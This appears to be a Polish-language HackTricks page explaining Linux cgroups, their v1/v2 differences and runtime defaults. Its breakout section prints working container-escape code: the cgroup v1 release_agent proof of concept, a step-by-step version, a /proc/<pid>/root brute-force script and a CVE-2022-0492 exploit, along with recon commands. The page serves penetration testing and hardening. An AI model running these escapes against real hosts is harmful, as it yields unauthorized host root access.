# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

Linux **control groups** to mechanizm jądra używany do grupowania procesów na potrzeby rozliczania, ograniczania, ustalania priorytetów i egzekwowania zasad. Jeśli namespaces dotyczą głównie izolowania sposobu postrzegania zasobów, to cgroups służą przede wszystkim do kontrolowania **ile** tych zasobów może zużywać dany zestaw procesów oraz, w niektórych przypadkach, **z jakimi klasami zasobów** może on w ogóle wchodzić w interakcję. Containers nieustannie korzystają z cgroups, nawet gdy użytkownik nigdy nie zagląda do nich bezpośrednio, ponieważ niemal każdy współczesny runtime potrzebuje sposobu, aby poinformować jądro: „te procesy należą do tego workloadu, a te zasady dotyczące zasobów mają do nich zastosowanie”.

Dlatego container engines umieszczają nowy container w jego własnym poddrzewie cgroup. Gdy drzewo procesów się tam znajduje, runtime może ograniczyć pamięć, zmniejszyć maksymalną liczbę PID-ów, ustalić wagę użycia CPU, regulować operacje I/O i ograniczyć dostęp do urządzeń. W środowisku produkcyjnym ma to kluczowe znaczenie zarówno dla bezpieczeństwa wielu tenantów, jak i dla zwykłej higieny operacyjnej. Container pozbawiony sensownych mechanizmów kontroli zasobów może wyczerpać pamięć, zalać system procesami albo zmonopolizować CPU i I/O w sposób destabilizujący hosta lub sąsiednie workloady.

Z perspektywy bezpieczeństwa cgroups mają znaczenie z dwóch odrębnych powodów. Po pierwsze, niewłaściwe lub brakujące limity zasobów umożliwiają proste ataki denial-of-service. Po drugie, niektóre funkcje cgroups, szczególnie w starszych konfiguracjach **cgroup v1**, historycznie tworzyły potężne primitives umożliwiające breakout, gdy można było je zapisywać z wnętrza containera.

## v1 a v2

W użyciu znajdują się dwa główne modele cgroup. **cgroup v1** udostępnia wiele hierarchii kontrolerów, a starsze opisy exploitów często koncentrują się na dostępnych tam nietypowych i czasami nadmiernie potężnych mechanizmach. **cgroup v2** wprowadza bardziej ujednoliconą hierarchię i ogólnie bardziej przejrzyste działanie. Nowoczesne dystrybucje coraz częściej preferują cgroup v2, ale nadal istnieją środowiska mieszane lub starsze, co oznacza, że podczas analizy rzeczywistych systemów oba modele pozostają istotne.

Różnica ma znaczenie, ponieważ niektóre z najsłynniejszych historii dotyczących container breakout, takie jak nadużycia **`release_agent`** w cgroup v1, są bardzo konkretnie związane ze starszym działaniem cgroup. Czytelnik, który znajdzie exploit cgroup na blogu, a następnie bezrefleksyjnie zastosuje go w nowoczesnym systemie obsługującym wyłącznie cgroup v2, prawdopodobnie błędnie oceni, co jest faktycznie możliwe na celu.

## Inspekcja

Najszybszym sposobem sprawdzenia, gdzie znajduje się bieżąca powłoka, jest:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Plik `/proc/self/cgroup` pokazuje ścieżki cgroup powiązane z bieżącym procesem. Na nowoczesnym hoście z cgroup v2 często widoczny będzie ujednolicony wpis. Na starszych lub hybrydowych hostach może być widocznych wiele ścieżek kontrolerów v1. Gdy znasz już ścieżkę, możesz sprawdzić odpowiadające jej pliki w `/sys/fs/cgroup`, aby zobaczyć limity i bieżące użycie.

Na hoście z cgroup v2 przydatne są następujące polecenia:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Pliki te ujawniają, które kontrolery istnieją i które z nich są delegowane do podrzędnych cgroups. Ten model delegowania ma znaczenie w środowiskach rootless i zarządzanych przez systemd, gdzie runtime może mieć możliwość kontrolowania jedynie tego podzbioru funkcji cgroups, który nadrzędna hierarchia faktycznie deleguje.

## Laboratorium

Jednym ze sposobów obserwowania cgroups w praktyce jest uruchomienie kontenera z ograniczeniem pamięci:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Możesz również wypróbować kontener z ograniczeniem PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Te przykłady są przydatne, ponieważ pomagają połączyć flagę runtime z interfejsem plików kernela. Runtime nie wymusza reguły za pomocą magii; zapisuje odpowiednie ustawienia cgroup, a następnie pozwala kernelowi egzekwować je wobec drzewa procesów.

## Użycie runtime

Docker, Podman, containerd i CRI-O korzystają z cgroups jako części normalnego działania. Różnice zwykle nie dotyczą tego, czy używają cgroups, lecz **które wartości domyślne wybierają**, **jak współdziałają z systemd**, **jak działa delegowanie rootless** oraz **jaka część konfiguracji jest kontrolowana na poziomie engine, a jaka na poziomie orkiestracji**.

W Kubernetes żądania zasobów i limity ostatecznie stają się konfiguracją cgroup na node. Ścieżka od YAML-a poda do egzekwowania przez kernel prowadzi przez kubelet, runtime CRI i runtime OCI, ale cgroups nadal są mechanizmem kernela, który ostatecznie stosuje regułę. W środowiskach Incus/LXC cgroups również są intensywnie wykorzystywane, szczególnie dlatego, że system containers często udostępniają bogatsze drzewo procesów i oczekiwania operacyjne bardziej zbliżone do VM.

## Błędne konfiguracje i breakouts

Klasyczna historia bezpieczeństwa cgroup dotyczy mechanizmu zapisywalnego **cgroup v1 `release_agent`**. W tym modelu, jeśli attacker mógł zapisywać do odpowiednich plików cgroup, włączyć `notify_on_release` i kontrolować ścieżkę przechowywaną w `release_agent`, kernel mógł ostatecznie wykonać wybraną przez attackera ścieżkę w początkowych namespaces na hoście, gdy cgroup stał się pusty. Dlatego starsze opracowania poświęcają tak dużo uwagi zapisywalności kontrolerów cgroup, opcjom montowania oraz warunkom związanym z namespaces/capabilities.

Nawet gdy `release_agent` jest niedostępny, błędy w konfiguracji cgroup nadal mają znaczenie. Nadmiernie szeroki dostęp do urządzeń może sprawić, że urządzenia hosta będą osiągalne z kontenera. Brak limitów pamięci i PID może przekształcić zwykłe code execution w DoS hosta. Słabe delegowanie cgroup w scenariuszach rootless może również wprowadzać defenderów w błąd, skłaniając ich do założenia, że ograniczenie istnieje, mimo że runtime nigdy nie był faktycznie w stanie go zastosować.

### Tło `release_agent`

Technika `release_agent` dotyczy wyłącznie **cgroup v1**. Podstawowa idea polega na tym, że gdy ostatni proces w cgroup zakończy działanie, a `notify_on_release=1` jest ustawione, kernel wykonuje program, którego ścieżka jest przechowywana w `release_agent`. To wykonanie następuje w **początkowych namespaces na hoście**, co sprawia, że zapisywalny `release_agent` staje się prymitywem container escape.

Aby technika zadziałała, attacker zazwyczaj potrzebuje:

- zapisywalnej hierarchii **cgroup v1**
- możliwości utworzenia lub użycia child cgroup
- możliwości ustawienia `notify_on_release`
- możliwości zapisania ścieżki do `release_agent`
- ścieżki, która z perspektywy hosta wskazuje na plik wykonywalny

### Klasyczny PoC

Historyczny one-liner PoC to:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ten PoC zapisuje ścieżkę payloadu do `release_agent`, wyzwala zwolnienie cgroup, a następnie odczytuje plik wyjściowy wygenerowany na hoście.

### Czytelne omówienie

Ta sama idea jest łatwiejsza do zrozumienia po podzieleniu jej na kroki.

1. Utwórz i przygotuj zapisywalną cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Zidentyfikuj ścieżkę hosta odpowiadającą systemowi plików kontenera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Umieść payload, który będzie widoczny ze ścieżki hosta:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Wyzwól wykonanie, opróżniając cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efektem jest wykonanie payloadu po stronie hosta z uprawnieniami host root. W realnym exploicie payload zwykle zapisuje proof file, uruchamia reverse shell lub modyfikuje stan hosta.

### Wariant ze ścieżką względną przy użyciu `/proc/<pid>/root`

W niektórych środowiskach ścieżka hosta do filesystemu kontenera nie jest oczywista lub jest ukryta przez storage driver. W takim przypadku ścieżkę payloadu można wyrazić za pomocą `/proc/<pid>/root/...`, gdzie `<pid>` to host PID należący do procesu w bieżącym kontenerze. Na tym opiera się wariant brute-force ze ścieżką względną:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Istotny trick nie polega tutaj na samym brute force, lecz na formie ścieżki: `/proc/<pid>/root/...` pozwala kernelowi rozwiązać plik wewnątrz filesystemu kontenera z poziomu host namespace, nawet gdy bezpośrednia ścieżka storage hosta nie jest wcześniej znana.

### CVE-2022-0492 Variant

W 2022 roku CVE-2022-0492 wykazało, że zapis do `release_agent` w cgroup v1 nie sprawdzał poprawnie `CAP_SYS_ADMIN` w **initial user namespace**. Dzięki temu technika była znacznie łatwiej dostępna na podatnych kernelach, ponieważ proces kontenera, który mógł zamontować hierarchię cgroup, mógł zapisać do `release_agent` bez wcześniejszego uzyskania uprawnień w host user namespace.

Minimalny exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na podatnym kernelu host wykonuje `/proc/self/exe` z uprawnieniami root na hoście.

W praktyce nadużycie zacznij od sprawdzenia, czy środowisko nadal udostępnia zapisywalne ścieżki cgroup-v1 lub niebezpieczny dostęp do urządzeń:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Jeśli `release_agent` jest obecny i można go zapisywać, znajdujesz się już na obszarze legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Jeśli sama ścieżka cgroup nie prowadzi do escape, kolejnym praktycznym zastosowaniem jest często denial of service lub reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Te polecenia szybko pokażą, czy workload ma możliwość uruchomienia fork-bomb, agresywnego zużywania pamięci lub nadużycia zapisywalnego interfejsu legacy cgroup.

## Sprawdzenia

Podczas przeglądu celu celem sprawdzeń cgroup jest ustalenie, który model cgroup jest używany, czy kontener widzi zapisywalne ścieżki kontrolerów oraz czy stare mechanizmy breakout, takie jak `release_agent`, są w ogóle istotne.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Co jest tutaj interesujące:

- Jeśli `mount | grep cgroup` pokazuje **cgroup v1**, starsze writeupy dotyczące breakout stają się bardziej istotne.
- Jeśli istnieje `release_agent` i można uzyskać do niego dostęp, warto od razu przeprowadzić dokładniejsze badanie.
- Jeśli widoczna hierarchia cgroup jest zapisywalna, a kontener ma również silne capabilities, środowisko zasługuje na znacznie dokładniejszy przegląd.

Jeśli wykryjesz **cgroup v1**, zapisywalne mounty kontrolerów oraz kontener, który ma również silne capabilities lub słabą ochronę seccomp/AppArmor, taka kombinacja wymaga szczególnej uwagi. cgroups często traktuje się jako nudny temat związany z zarządzaniem zasobami, ale historycznie były one częścią niektórych z najbardziej pouczających łańcuchów container escape — właśnie dlatego, że granica między „kontrolą zasobów” a „wpływem na hosta” nie zawsze była tak wyraźna, jak zakładano.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie włączone | Kontenery są automatycznie umieszczane w cgroups; limity zasobów są opcjonalne, chyba że zostaną ustawione za pomocą flag | pominięcie `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Domyślnie włączone | `--cgroups=enabled` jest ustawieniem domyślnym; domyślne ustawienia przestrzeni nazw cgroup różnią się w zależności od wersji cgroup (`private` w cgroup v2, `host` w niektórych konfiguracjach cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, złagodzony dostęp do urządzeń, `--privileged` |
| Kubernetes | Domyślnie włączone przez runtime | Pody i kontenery są umieszczane w cgroups przez runtime węzła; szczegółowa kontrola zasobów zależy od `resources.requests` / `resources.limits` | pominięcie requestów/limitów zasobów, uprzywilejowany dostęp do urządzeń, błędna konfiguracja runtime na poziomie hosta |
| containerd / CRI-O | Domyślnie włączone | cgroups są częścią standardowego zarządzania cyklem życia | bezpośrednie konfiguracje runtime łagodzące kontrolę urządzeń lub udostępniające starsze zapisywalne interfejsy cgroup v1 |

Ważne rozróżnienie polega na tym, że **istnienie cgroup** jest zwykle domyślne, natomiast **użyteczne ograniczenia zasobów** często są opcjonalne, chyba że zostaną jawnie skonfigurowane.
{{#include ../../../../banners/hacktricks-training.md}}
